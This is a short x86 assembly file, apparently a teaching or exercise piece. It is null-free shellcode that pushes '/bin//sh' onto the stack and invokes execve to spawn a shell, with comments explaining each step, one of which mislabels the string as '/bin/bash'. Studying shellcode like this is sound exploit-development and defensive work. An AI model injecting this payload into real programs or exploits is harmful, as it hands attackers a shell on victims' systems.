global _start

section .text

_start:
    xor eax, eax
    push eax		; NULL-Terminator for "/bin/sh"

   			; Place "/bin/sh" string splitted by two parts
			; in little-endian form to the Stack:
    push 0x68732f2f	; push "hs//" - extra / to avoid \x00
    push 0x6e69622f	; push "nib/"
   
    mov ebx, esp	; EBX points to the "/bin/bash" string 
 
    xor ecx, ecx 	; Set 0 all other params
    xor edx, edx        ; for SYS_EXECVE
    xor esi, esi

    mov al, 0x0b 	; SYS_EXECVE CODE
    int 0x80       

section .data
